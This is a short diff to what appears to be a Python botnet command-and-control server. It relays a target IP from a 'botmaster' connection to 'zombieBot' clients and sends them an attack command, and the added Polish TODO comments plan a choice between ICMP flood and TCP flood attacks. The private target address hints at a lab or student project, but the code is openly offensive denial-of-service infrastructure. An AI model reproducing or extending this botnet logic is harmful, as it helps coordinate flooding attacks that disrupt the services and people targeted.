@@ -16,6 +16,13 @@ startAttack: bool = False
 def thread_for_botmaster(c, st):
     global startAttack
     print('Botmaster Connected')
+    #todo:odebrac rodzaj ataku od botmastera
+    # 1-icmp flood
+    # 2-Tcp Flood
+    # if rec == 1:
+    #   attack_type = 'icmp_flood'
+    # if rec == 2:
+    #   attack_type = 'tcp_flood'
     ip = str(c.recv(16).decode())
     print('received target ip=' + ip)
     startAttack = True
@@ -32,6 +39,7 @@ def thread_for_zombieBot(c, addr):
             continue
 
         try:
+            #todo:w zaleznosci od ataku wyslij odpowiedni identyfikator tj. 1,2,3 itd
             c.send('1'.encode())
             time.sleep(0.5)
             c.send('192.168.100.8'.encode())
